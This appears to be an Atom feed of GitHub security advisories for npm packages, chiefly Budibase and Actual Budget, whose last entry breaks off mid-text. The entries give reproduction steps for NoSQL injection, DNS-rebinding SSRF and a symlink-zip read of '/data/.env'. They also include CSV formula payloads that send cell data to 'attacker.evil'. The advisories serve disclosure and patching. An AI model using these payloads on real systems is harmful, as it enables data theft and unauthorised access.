<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-06-24T11:57:32.553Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@budibase/server] Budibase has nonymous NoSQL operator injection via published-app query templates]]></title>
        <id>https://github.com/advisories/GHSA-8qv3-p479-cj62</id>
        <link href="https://github.com/advisories/GHSA-8qv3-p479-cj62"/>
        <updated>2026-06-23T17:43:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>enrichContext</code> at <code>packages/server/src/sdk/workspace/queries/queries.ts:121-138</code> substitutes parameter values into the raw JSON body of a query, then <code>JSON.parse</code>s the result. The validator <code>validateQueryInputs</code> at <code>packages/server/src/api/controllers/query/index.ts:61-71</code> rejects only Handlebars markers (<code>{{</code>, <code>}}</code>) in user input and does not escape JSON metacharacters (<code>"</code>, <code>\</code>, <code>}</code>). A parameter value containing a closing quote and additional keys lifts attacker-controlled fields into the parsed filter object.</p>
<p>For Mongo <code>find</code>, the parsed filter passes directly to <code>collection.find()</code> (<code>packages/server/src/integrations/mongodb.ts:506-510</code>). Duplicate-key JSON parsing overrides the builder's <code>{name: "..."}</code> with <code>{name: {$exists: true}}</code> and returns every document. The same primitive against an <code>updateMany</code> query (<code>mongodb.ts:577-585</code>) widens the filter scope to the full collection while the builder-controlled <code>$set</code> body runs against every matched document.</p>
<p>The <code>authorized</code> middleware at <code>packages/server/src/middleware/authorized.ts:141-148</code> short-circuits when the query's role is <code>PUBLIC</code>. CSRF is not enforced on this path. <code>POST /api/v2/queries/:queryId</code> (<code>packages/server/src/api/routes/query.ts:63</code>) accepts the call with no session, only an <code>x-budibase-app-id</code> header that is public from the published-app URL.</p>
<p>Result: an unauthenticated visitor of any published Budibase app reads every document of the backing MongoDB, CouchDB, Elasticsearch, DynamoDB-PartiQL, or REST-with-JSON-body collection and, where the builder has published a PUBLIC write query, modifies every document of that collection with one HTTP request.</p>
<h2 id="affected">Affected</h2>
<p><code>Budibase/budibase</code> server, <code>@budibase/server</code> package, <code>&lt;= 3.39.0</code> (HEAD <code>feab995</code>, released 2026-05-20).</p>
<p>Reachable on any deployment where a workspace builder has set the role of a non-SQL query (MongoDB, CouchDB, Elasticsearch, DynamoDB-PartiQL, or REST with <code>bodyType=json</code>) to <code>PUBLIC</code> and published the app. This is the canonical low-code public-form use case.</p>
<p>SQL datasources (Postgres, MySQL, MSSQL, Oracle, MariaDB) route through <code>interpolateSQL</code> and are not affected.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>packages/server/src/sdk/workspace/queries/queries.ts:121-138</code>: <code>processStringSync(fields[key], parameters, {noEscaping: true, noHelpers: true})</code> writes the raw parameter value into the JSON-body string with no JSON-string escape; the followup <code>JSON.parse(enrichedQuery.json || enrichedQuery.customData || enrichedQuery.requestBody)</code> lifts the substituted text into the integration filter object.</p>
<p><code>packages/server/src/api/controllers/query/index.ts:61-71</code>: <code>validateQueryInputs</code> only rejects values where <code>findHBSBlocks(value).length !== 0</code> (Handlebars markers) and ignores JSON metacharacters.</p>
<p><code>packages/server/src/integrations/mongodb.ts:506-510</code>: <code>collection.find(json)</code> receives the user-controlled filter object directly with no key prefix or operator allow-list.</p>
<p><code>packages/server/src/integrations/mongodb.ts:577-585</code>: <code>collection.updateMany(json.filter, json.update, json.options)</code> accepts the templated filter without verifying that the substituted filter still matches the builder's intent.</p>
<p><code>packages/server/src/middleware/authorized.ts:141-148</code>: <code>if (resourceRoles.includes(roles.BUILTIN_ROLE_IDS.PUBLIC)) return next()</code> skips both authentication and CSRF.</p>
<p><code>packages/server/src/integrations/queries/sql.ts:29-122</code>: <code>interpolateSQL</code> rewrites every <code>{{ binding }}</code> to a positional bind placeholder (<code>$N</code> or <code>?</code>). The SQL leg is bind-parameterised; the JSON leg is not.</p>
<h2 id="reproduction">Reproduction</h2>
<p><code>budibase/budibase:latest</code> (<code>v3.39.0</code>) Docker single-container, default config. Builder logs in once, creates a MongoDB datasource, creates a query <code>GetUserByName</code> with body <code>{ "name": "{{ name }}" }</code>, sets the query role to <code>PUBLIC</code>, and publishes the app.</p>
<ol>
<li>Anonymous client sends the inject payload to the read query.</li>
</ol>
<pre><code class="language-http">POST /api/v2/queries/&lt;read-queryId&gt; HTTP/1.1
Host: &lt;budibase-host&gt;
x-budibase-app-id: &lt;published-appId&gt;
Content-Type: application/json

{"parameters":{"name":"x\",\"name\":{\"$exists\":true},\"$comment\":\"audit"}}
</code></pre>
<pre><code class="language-json">{"data":[
  {"_id":"...","name":"alice","secret":"alice-secret-flag"},
  {"_id":"...","name":"bob","secret":"bob-secret-flag"},
  {"_id":"...","name":"admin","role":"admin","secret":"ADMIN-SUPER-SECRET-FLAG"}
]}
</code></pre>
<ol start="2">
<li>Builder publishes a second query <code>TouchUser</code> (verb <code>update</code>, action <code>updateMany</code>, body <code>{ "filter": { "name": "{{ name }}" }, "update": { "$set": { "touched": true } } }</code>, role <code>PUBLIC</code>). Anonymous client sends the same inject pattern.</li>
</ol>
<pre><code class="language-http">POST /api/v2/queries/&lt;updateMany-queryId&gt; HTTP/1.1
Host: &lt;budibase-host&gt;
x-budibase-app-id: &lt;published-appId&gt;
Content-Type: application/json

{"parameters":{"name":"x\",\"name\":{\"$exists\":true},\"$comment\":\"esc"}}
</code></pre>
<pre><code class="language-json">{"data":[{"acknowledged":true,"matchedCount":3,"modifiedCount":3,"upsertedId":null,"upsertedCount":0}]}
</code></pre>
<p>Live-verified: against Budibase v3.39.0 on 2026-05-20, anonymous read returned every document including <code>ADMIN-SUPER-SECRET-FLAG</code>; anonymous <code>updateMany</code> reported <code>matchedCount: 3, modifiedCount: 3</code> against a 3-document collection where the builder's filter intended <code>name = "x"</code>.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>Anonymous read of every document in any backing MongoDB, CouchDB, Elasticsearch, DynamoDB-PartiQL, or REST-with-JSON-body collection reachable through a <code>PUBLIC</code> query, including columns the published query was not designed to return (<code>password_hash</code>, <code>secret</code>, <code>api_token</code>, <code>mfa_secret</code>).</li>
<li>Anonymous modification of every document of that collection where the builder has published a <code>PUBLIC</code> <code>update</code>, <code>delete</code>, or <code>aggregate</code> query, beyond the builder's intended single-document scope.</li>
<li>One HTTP request, no session, no CSRF, no user interaction.</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Jan Kahmen, <a href="https://turingpoint.de">turingpoint</a> (<a href="mailto:jan@turingpoint.de">jan@turingpoint.de</a>).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-8qv3-p479-cj62">https://github.com/Budibase/budibase/security/advisories/GHSA-8qv3-p479-cj62</a></li>
<li><a href="https://github.com/advisories/GHSA-8qv3-p479-cj62">https://github.com/advisories/GHSA-8qv3-p479-cj62</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8qv3-p479-cj62</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-23T17:43:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@actual-app/web] @actual-app/web has CSV Formula Injection in Transaction Export via Imported Payee/Notes Fields]]></title>
        <id>https://github.com/advisories/GHSA-xqjm-27pc-rvwm</id>
        <link href="https://github.com/advisories/GHSA-xqjm-27pc-rvwm"/>
        <updated>2026-06-22T23:48:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>exportToCSV</code> and <code>exportQueryToCSV</code> in <code>packages/loot-core/src/server/transactions/export/export-to-csv.ts</code> pass user-controlled <code>Payee</code>, <code>Notes</code>, <code>Account</code>, and <code>Category</code> strings to <code>csv-stringify</code> with no <code>cast</code> callback and no formula-prefix neutralization. Strings that begin with <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, tab, or carriage return survive verbatim into the exported CSV. When the victim (or anyone they share the export with) opens the file in Excel, LibreOffice Calc, or Google Sheets, the strings are interpreted as formulas. <code>=HYPERLINK("http://attacker/?leak="&amp;B2,"Bank refund")</code> is the most reliable variant: it renders as a clickable link with benign text and exfiltrates adjacent cells (transaction amount, account name, payee, balance) on click, with no security prompt in modern Excel/Sheets. <code>=WEBSERVICE</code>/<code>=IMPORTXML</code> provide auto-firing exfil in some configurations; legacy DDE may achieve RCE on older Excel.</p>
<h2 id="details">Details</h2>
<p>Sink — <code>packages/loot-core/src/server/transactions/export/export-to-csv.ts:56</code>:</p>
<pre><code class="language-ts">return csvStringify(transactionsForExport, { header: true });
</code></pre>
<p>and the same call again at <code>export-to-csv.ts:131</code> for <code>exportQueryToCSV</code>. <code>csv-stringify</code> v6 does not neutralize formula-trigger characters by default; only quote/comma/CRLF escaping is applied. There is no shared wrapper — <code>grep</code> for <code>csvStringify</code> finds exactly one source file across the monorepo.</p>
<p>Source of attacker-controlled <code>Payee</code>/<code>Notes</code>:</p>
<ul>
<li><code>packages/loot-core/src/server/transactions/import/parse-file.ts:77</code> dispatches uploaded files to <code>parseCSV</code> (<code>:109</code>), <code>parseOFX</code> (<code>:200</code>), <code>parseQIF</code> (<code>:158</code>), <code>parseCAMT</code> (<code>:250</code>). None of them strip or escape formula prefixes from <code>payee_name</code>/<code>imported_payee</code>/<code>notes</code>.</li>
<li>For OFX, <code>mapOfxTransaction</code> in <code>packages/loot-core/src/server/transactions/import/ofx2json.ts</code> only runs <code>html2Plain</code> (HTML entity decoding) on the NAME field — <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, <code>\t</code> are untouched.</li>
<li><code>sync.normalizeTransactions</code> (<code>packages/loot-core/src/server/transactions/sync.ts</code>) applies <code>title()</code> casing, which only mutates letters via <code>String.toLowerCase</code>; non-letter prefix characters are preserved, and Excel formulas are case-insensitive (<code>=hyperlink(...)</code> parses identically to <code>=HYPERLINK(...)</code>).</li>
<li>The payee can also be entered directly through the UI or set via the <code>@actual-app/api</code>'s payee/transaction CRUD endpoints — anyone with write access to a shared budget can plant the payload.</li>
</ul>
<p>Verification that <code>csv-stringify</code> does not neutralize formulas:</p>
<pre><code>$ node -e "const{stringify}=require('csv-stringify/sync');console.log(stringify([{Payee:'=HYPERLINK(\"http://x/?\"&amp;B2,\"refund\")'}],{header:true}))"
Payee
"=HYPERLINK(""http://x/?""&amp;B2,""refund"")"
</code></pre>
<p>The double-quote escaping is intact, but the leading <code>=</code> is not prefixed with <code>'</code> or otherwise neutralized — Excel, LibreOffice Calc, and Google Sheets will all evaluate this as a formula on open.</p>
<h2 id="poc">PoC</h2>
<ol>
<li>Attacker delivers a malicious file the victim is willing to import (fake bank OFX statement, shared budget file, expense-tracking CSV from a collaborator). Example malicious CSV the victim drops into "Import file":</li>
</ol>
<pre><code>Date,Payee,Amount
2026-01-01,"=HYPERLINK(""http://attacker.evil/leak?d=""&amp;B2&amp;C2,""Bank refund details"")",100.00
2026-01-02,"@SUM(1+1)*cmd|'/c calc'!A0",50.00
2026-01-03,"+1+1",-25.00
2026-01-04,"=WEBSERVICE(""http://attacker.evil/?d=""&amp;B2)",10.00
</code></pre>
<ol start="2">
<li>Victim imports through Account → Import file. <code>parseFile</code> (<code>parse-file.ts:77</code>) → <code>parseCSV</code>/<code>parseOFX</code>/<code>parseQIF</code>/<code>parseCAMT</code> returns rows with the formula strings preserved as <code>payee_name</code>. <code>sync.normalizeTransactions</code> does not strip the prefix characters.</li>
<li>Payees are persisted into the <code>payees</code> table verbatim.</li>
<li>Some time later the victim runs Account → menu → Export. <code>transactions-export-query</code> invokes <code>exportQueryToCSV</code> (<code>export-to-csv.ts:131</code>).</li>
<li>The exported file looks like (verified output shape from <code>csvStringify</code>):</li>
</ol>
<pre><code>Account,Date,Payee,Notes,Category_Group,Category,Amount,Split_Amount,Cleared
Checking,2026-01-01,"=HYPERLINK(""http://attacker.evil/leak?d=""&amp;B2&amp;C2,""Bank refund details"")",,,,100.00,0,Not cleared
Checking,2026-01-02,@SUM(1+1)*cmd|'/c calc'!A0,,,,50.00,0,Not cleared
Checking,2026-01-03,+1+1,,,,-25.00,0,Not cleared
Checking,2026-01-04,"=WEBSERVICE(""http://attacker.evil/?d=""&amp;B2)",,,,10.00,0,Not cleared
</code></pre>
<ol start="6">
<li>Victim or downstream recipient (accountant, spouse, tax preparer) opens the CSV in Excel/LibreOffice/Sheets. <code>=HYPERLINK(...)</code> renders as a clickable link that exfiltrates adjacent cell values to attacker on click; <code>=WEBSERVICE</code>/<code>=IMPORTXML</code> (Sheets/LibreOffice) fire automatically; legacy <code>=cmd|...</code> DDE may execute on unpatched Excel.</li>
</ol>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Confidentiality</strong>: Adjacent transaction data (amounts, account names, balances, payees, categories) can be exfiltrated to attacker-controlled URLs through <code>=HYPERLINK</code> clicks or auto-firing <code>=WEBSERVICE</code>/<code>=IMPORTXML</code>.</li>
<li><strong>Integrity</strong>: Spreadsheet recipients (accountants, tax preparers) see attacker-chosen display values where they expected raw payee names, enabling fraud (e.g., forged "Refund" line items linking to phishing).</li>
<li><strong>Reach</strong>: Exports from Actual Budget are commonly shared with third parties (accountants, tax software, household members). One malicious imported statement contaminates every future export of that budget.</li>
<li><strong>Note on AC:H</strong>: requires victim-driven import → export → spreadsheet open. Modern Excel disables DDE by default, narrowing the RCE pathway, but <code>=HYPERLINK</code> exfil is universal and silent.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Pass a <code>cast.string</code> callback to <code>csv-stringify</code> that prefixes any formula-trigger string with a single quote, the OWASP-recommended neutralization. Apply at both call sites in <code>packages/loot-core/src/server/transactions/export/export-to-csv.ts</code>:</p>
<pre><code class="language-ts">import { stringify as csvStringify } from 'csv-stringify/sync';

const FORMULA_PREFIX = /^[=+\-@\t\r]/;

function neutralizeFormula(value: string): string {
  return FORMULA_PREFIX.test(value) ? `'${value}` : value;
}

const csvOptions = {
  header: true,
  cast: {
    string: (value: string) =&gt; neutralizeFormula(value),
  },
} as const;

// export-to-csv.ts:56
return csvStringify(transactionsForExport, csvOptions);

// export-to-csv.ts:131
return csvStringify(transactionsForExport, csvOptions);
</code></pre>
<p>Alternative defenses to consider in addition:</p>
<ul>
<li>Strip/neutralize formula prefixes on import in <code>parse-file.ts</code> for <code>payee_name</code>/<code>notes</code> so the database never contains formula-shaped strings (defense in depth — protects any future export consumers).</li>
<li>Add a regression unit test that asserts every CSV cell starting with <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, <code>\t</code>, or <code>\r</code> is prefixed with <code>'</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/actualbudget/actual/security/advisories/GHSA-xqjm-27pc-rvwm">https://github.com/actualbudget/actual/security/advisories/GHSA-xqjm-27pc-rvwm</a></li>
<li><a href="https://github.com/advisories/GHSA-xqjm-27pc-rvwm">https://github.com/advisories/GHSA-xqjm-27pc-rvwm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xqjm-27pc-rvwm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-22T23:48:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/backend-core] @budibase/backend-core has potential SSRF DNS rebinding bypass in outbound fetch validation]]></title>
        <id>https://github.com/advisories/GHSA-gfq7-5x4g-3xhf</id>
        <link href="https://github.com/advisories/GHSA-gfq7-5x4g-3xhf"/>
        <updated>2026-06-22T23:39:28.000Z</updated>
        <content type="html"><![CDATA[<p>Summary</p>
<p>Authenticated users with automation permissions can bypass Budibase's SSRF blacklist through DNS rebinding.</p>
<p>The outbound fetch flow validates a hostname against the blacklist before the request is sent, but the actual socket connection later performs a separate DNS lookup through node-fetch. Since the validated IPs are never pinned to the connection, an attacker-controlled hostname can return a public IP during validation and a private/internal IP during the real connection.</p>
<p>This results in a non-blind SSRF primitive against internal services reachable from the Budibase host, including loopback, RFC1918 ranges, and cloud metadata endpoints.</p>
<p>Details</p>
<p>The issue comes from the outbound fetch validation flow resolving DNS twice:</p>
<p>During blacklist validation
Again during the real socket connection</p>
<p>The first lookup result is discarded after validation, so the second lookup is free to resolve to a different IP.</p>
<p>This creates a classic TOCTOU DNS rebinding issue.</p>
<p>Affected flow in:</p>
<p>packages/backend-core/src/utils/outboundFetch.ts</p>
<pre><code>async function throwIfUnsafe(url: string): Promise&lt;void&gt; {
  const parsed = parseUrl(url)

  if (await isBlacklisted(parsed.hostname)) {
    throw new Error("URL is blocked or could not be resolved safely.")
  }
}

for (let redirects = 0; redirects &lt;= MAX_REDIRECTS; redirects++) {
  await throwIfUnsafe(nextUrl)

  const response = await fetchFn(nextUrl, nextRequest)

  // ...
}
</code></pre>
<p>fetchFn uses plain node-fetch with no custom http.Agent / https.Agent, so the underlying socket performs its own independent dns.lookup after validation completes.</p>
<p>The same pattern also exists in:</p>
<p>packages/server/src/automations/steps/utils.ts</p>
<pre><code>await throwIfBlacklisted(nextUrl)

const response = await fetch(nextUrl, nextRequest)
</code></pre>
<p>The blacklist implementation resolves hostnames but only returns a boolean:</p>
<p>packages/backend-core/src/blacklist/blacklist.ts</p>
<pre><code>async function lookup(address: string): Promise&lt;string[]&gt; {
  address = parseAddress(address)

  const addresses = await performLookup(address, { all: true })

  return addresses.map(addr =&gt; addr.address)
}

export async function isBlacklisted(address: string): Promise&lt;boolean&gt; {
  // ...

  if (!net.isIP(address)) {
    try {
      ips = await lookup(address)
    } catch (e) {
      /* ... */
    }
  } else {
    ips = [address]
  }

  return ips.some(ip =&gt; blackList!.check(ip, getIpVersion(ip)))
}
</code></pre>
<p>The resolved IPs are discarded, so callers cannot pin the later socket connection to the validated addresses.</p>
<p>An attacker controlling authoritative DNS for a hostname can therefore return:</p>
<p>a public IP during validation
a private/internal IP during the actual connection</p>
<p>Anything routing through these helpers inherits the issue, including:</p>
<p>outgoing webhook
Slack
Discord
Make
Zapier
n8n
AI extract
object-store fetches</p>
<p>Several of these steps return upstream response content directly into automation output, which makes the SSRF non-blind.</p>
<p>PoC</p>
<p>Tested locally against a self-hosted build from master.
No Budibase-operated infrastructure was touched.</p>
<p>Run Budibase locally.</p>
<p>Start a harmless local HTTP listener:</p>
<p>python3 -m http.server 8080 --bind 127.0.0.1</p>
<p>Use a rebinding hostname such as:</p>
<p>7f000001.cb007264.rbndr.us</p>
<p>which rotates between:</p>
<p>127.0.0.1
203.0.113.100</p>
<p>Steps to reproduce:</p>
<p>Log into Budibase with automation permissions.
Create an automation using the Outgoing Webhook step.
Set the URL to:
http://:8080/
Trigger the automation.</p>
<p>Observed result:</p>
<p>The blacklist validation resolves the hostname to the public IP and allows the request.
node-fetch performs a second DNS lookup during socket creation.
The second lookup resolves to 127.0.0.1.
The TCP connection lands on the local service.
The local server response body appears directly in the automation output.
Impact</p>
<p>This produces a non-blind read-SSRF primitive against anything reachable from the Budibase host process, including:</p>
<p>loopback services (127.0.0.1)
RFC1918 ranges
internal Kubernetes/VPC services
cloud metadata endpoints (169.254.169.254)</p>
<p>On cloud deployments without IMDSv2 enforcement, this may expose temporary IAM credentials via:</p>
<p>/latest/meta-data/iam/security-credentials/</p>
<p>On multi-tenant hosted deployments, this may also create potential cross-tenant access paths through shared internal infrastructure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-gfq7-5x4g-3xhf">https://github.com/Budibase/budibase/security/advisories/GHSA-gfq7-5x4g-3xhf</a></li>
<li><a href="https://github.com/advisories/GHSA-gfq7-5x4g-3xhf">https://github.com/advisories/GHSA-gfq7-5x4g-3xhf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gfq7-5x4g-3xhf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T23:39:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server] Budibase has arbitrary file read by workspace-builder via PWA-zip symlink upload]]></title>
        <id>https://github.com/advisories/GHSA-w7mq-r738-x278</id>
        <link href="https://github.com/advisories/GHSA-w7mq-r738-x278"/>
        <updated>2026-06-22T23:33:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>POST /api/pwa/process-zip</code> at <code>packages/server/src/api/routes/static.ts:24</code> accepts a builder-uploaded <code>.zip</code>, extracts it with <code>extract-zip@2.0.1</code> into a temp directory, then for each entry listed in <code>icons.json</code> validates the icon path, opens it, and streams the bytes into MinIO. The resulting object is served back via <code>GET /api/assets/{appId}/pwa/{uuid}.png</code>.</p>
<p><code>extract-zip@2.0.1</code> preserves absolute symlink targets when restoring symlink entries. The icon-source validator at <code>packages/server/src/api/controllers/static/index.ts:259-268</code> resolves the icon source string against <code>baseDir</code> (<code>path.resolve</code>), checks <code>resolvedSrc.startsWith(baseDir + path.sep)</code> against that string, and calls <code>fs.existsSync(resolvedSrc)</code> which follows symbolic links to confirm the target exists. None of the three calls reject symbolic-link entries, so an entry stored at <code>baseDir/evil.png</code> but pointing at <code>/data/.env</code> passes the gate.</p>
<p><code>packages/backend-core/src/objectStore/objectStore.ts:302</code> then calls <code>(await fsp.open(path)).createReadStream()</code> on the resolved path. <code>fsp.open</code> follows the symlink, the target file's bytes stream into MinIO, and the response of the asset-fetch endpoint returns those bytes verbatim.</p>
<p>Result: a workspace-level builder reads any file the server process can open (root inside the default Docker image, including <code>/data/.env</code> with <code>JWT_SECRET</code>, <code>INTERNAL_API_KEY</code>, <code>MINIO_*</code>, <code>REDIS_PASSWORD</code>, <code>COUCHDB_PASSWORD</code>, <code>DATABASE_URL</code>) by uploading one crafted PWA zip.</p>
<h2 id="affected">Affected</h2>
<p><code>Budibase/budibase</code> server, <code>@budibase/server</code> package, <code>&lt;= 3.39.0</code> (HEAD <code>feab995</code>, released 2026-05-20).</p>
<p>Reachable in stock self-hosted deployments. The default <code>budibase/budibase:latest</code> Docker image runs the Node server as <code>root</code> inside the container; the server process opens <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/data/.env</code>, and every other root-readable file. Reachable from any account with the workspace-builder permission on at least one app.</p>
<p>Not affected: managed cloud-hosted Budibase tenants where the file-system root is sandboxed away from secret material.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>packages/server/src/api/routes/static.ts:24</code>: <code>.post("/api/pwa/process-zip", authorized(BUILDER), controller.processPWAZip)</code> exposes the endpoint to any workspace builder; the only permission required is <code>BUILDER</code>.</p>
<p><code>packages/server/src/api/controllers/static/index.ts:235</code>: <code>await extract(filePath, { dir: tempDir })</code> calls <code>extract-zip@2.0.1</code>, which preserves absolute symlink targets when restoring symlink entries.</p>
<p><code>packages/server/src/api/controllers/static/index.ts:259-268</code>: the icon validator (<code>path.resolve</code> + <code>resolvedSrc.startsWith(baseDir + path.sep)</code> + <code>fs.existsSync</code>) operates on the resolved string path and on <code>fs.existsSync</code> (which follows symbolic links). A symlink stored under <code>baseDir</code> whose target points anywhere reachable by the server passes the gate as long as the target exists.</p>
<p><code>packages/backend-core/src/objectStore/objectStore.ts:302</code>: <code>(await fsp.open(path)).createReadStream()</code> follows the symlink and streams the target file's bytes; the object lands in MinIO under <code>{appId}/pwa/{uuid}{extension}</code> and is served by <code>GET /api/assets/{appId}/pwa/{uuid}.{ext}</code> (<code>packages/server/src/api/routes/static.ts:21</code>).</p>
<p><code>hosting/single/Dockerfile</code>: the production single-container image runs the Node server as <code>root</code>, so the read primitive reaches <code>/etc/shadow</code>, <code>/data/.env</code>, and every other root-readable path.</p>
<h2 id="reproduction">Reproduction</h2>
<p><code>budibase/budibase:latest</code> (<code>v3.39.0</code>) Docker single-container on <code>localhost:10000</code>, default config, with any workspace builder logged in. Cookie jar and <code>&lt;CSRF&gt;</code> token come from <code>GET /api/global/self</code>.</p>
<ol>
<li>Builder uploads a zip containing one symlink entry that targets <code>/data/.env</code>, plus an <code>icons.json</code> that references the symlink.</li>
</ol>
<pre><code class="language-bash">mkdir attack &amp;&amp; cd attack
ln -s /data/.env evil.png
printf '{"name":"x","icons":[{"src":"evil.png","sizes":"192x192","type":"image/png"}]}' &gt; icons.json
zip -y attack.zip icons.json evil.png

curl -s "http://localhost:10000/api/pwa/process-zip" \
  -b cookies.txt \
  -H "x-budibase-app-id: &lt;appId&gt;" \
  -H "x-csrf-token: &lt;CSRF&gt;" \
  -F "file=@attack.zip"
</code></pre>
<pre><code class="language-json">{"icons":[{"src":"&lt;appId&gt;/pwa/c9370128-885a-48bc-bd1c-5522f4c8020f.png","sizes":"192x192","type":"image/png"}]}
</code></pre>
<ol start="2">
<li>Builder fetches the resulting "icon".</li>
</ol>
<pre><code class="language-http">GET /api/assets/&lt;appId&gt;/pwa/c9370128-885a-48bc-bd1c-5522f4c8020f.png HTTP/1.1
Host: localhost:10000
Cookie: budibase:auth=&lt;JWT&gt;; budibase:auth.sig=&lt;SIG&gt;
</code></pre>
<pre><code>COUCHDB_USER=admin
COUCHDB_PASSWORD=admin
MINIO_ACCESS_KEY=bd501fa31bf44a7e8beb6f7b628c6def
MINIO_SECRET_KEY=bf754d8f29434fc997225e10f55de778
INTERNAL_API_KEY=e9580f58b18b4371868aa3442c57522c
JWT_SECRET=c5441dc903f845bdb93a98b949a612b2
REDIS_PASSWORD=50739fb539504149a5fd85c85fe6750c
DATABASE_URL=postgresql://llmproxy:...@127.0.0.1:5432/litellm
</code></pre>
<p>Live-verified: the response body of the asset-fetch endpoint is byte-identical to <code>docker exec budibase cat /data/.env</code>; <code>/etc/passwd</code> and <code>/etc/shadow</code> extract via the same primitive when their permissions allow root reads.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>Disclosure of <code>/data/.env</code>: <code>JWT_SECRET</code>, <code>INTERNAL_API_KEY</code>, <code>MINIO_ACCESS_KEY</code>, <code>MINIO_SECRET_KEY</code>, <code>REDIS_PASSWORD</code>, <code>COUCHDB_PASSWORD</code>, <code>LITELLM_MASTER_KEY</code>, <code>DATABASE_URL</code>.</li>
<li>HS256 JWT forge with the leaked <code>JWT_SECRET</code> against any user id, including the global admin: scope-changing escalation from workspace-builder to global-admin.</li>
<li>Cross-tenant exposure on multi-tenant installs once the global-admin forge succeeds.</li>
<li>Disclosure of <code>/etc/passwd</code> and <code>/etc/shadow</code> via the same primitive when the container runs as <code>root</code> (the shipped default).</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Jan Kahmen, <a href="https://turingpoint.de">turingpoint</a> (<a href="mailto:jan@turingpoint.de">jan@turingpoint.de</a>).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-w7mq-r738-x278">https://github.com/Budibase/budibase/security/advisories/GHSA-w7mq-r738-x278</a></li>
<li><a href="https://github.com/advisories/GHSA-w7mq-r738-x278">https://github.com/advisories/GHSA-w7mq-r738-x278</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w7mq-r738-x278</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-22T23:33:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@actual-app/sync-server] @actual-app/sync-server: Disabled OpenID users keep access through existing session tokens]]></title>
        <id>https://github.com/advisories/GHSA-cq9c-6w48-qmfg</id>
        <link href="https://github.com/advisories/GHSA-cq9c-6w48-qmfg"/>
        <updated>2026-06-22T23:20:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In OpenID multi-user mode, disabling a user only blocks future OpenID login for that identity. Existing Actual session tokens for the disabled user remain valid, so the user can continue calling authenticated server endpoints after an administrator has disabled the account.</p>
<h3 id="details">Details</h3>
<p>The disabled-user check is present during OpenID login finalization. Existing users are only accepted when the matching row has <code>enabled = 1</code>, and a disabled row causes the OpenID grant to fail before a new session token is created.</p>
<pre><code class="language-ts">// packages/sync-server/src/accounts/openid.ts:284-291
const { id: userIdFromDb, display_name: displayName } =
  accountDb.first(
    'SELECT id, display_name FROM users WHERE user_name = ? and enabled = 1',
    [identity],
  ) || {};

if (userIdFromDb == null) {
  throw new Error('openid-grant-failed');
}
</code></pre>
<p>The shared session validation path does not perform the same enabled-user check. It accepts any existing token row that has not expired, then returns the session object to every route protected by <code>validateSessionMiddleware</code>.</p>
<pre><code class="language-ts">// packages/sync-server/src/util/validate-user.ts:10-41
export function validateSession(req: Request, res: Response) {
  let { token } = req.body || {};
  if (!token) {
    token = req.headers['x-actual-token'];
  }

  const session = getSession(token);
  ...
  return session;
}
</code></pre>
<p>This means account disablement and session authorization diverge:</p>
<pre><code class="language-text">OpenID login path: users.enabled must be 1
Existing session path: token exists and is not expired; users.enabled is not checked
</code></pre>
<p>The default token expiration setting is <code>never</code>, so this is not just a short race after disablement on default deployments.</p>
<pre><code class="language-js">// packages/sync-server/src/load-config.js:260-264
token_expiration: {
  doc: 'Token expiration time.',
  format: 'tokenExpiration',
  default: 'never',
  env: 'ACTUAL_TOKEN_EXPIRATION',
},
</code></pre>
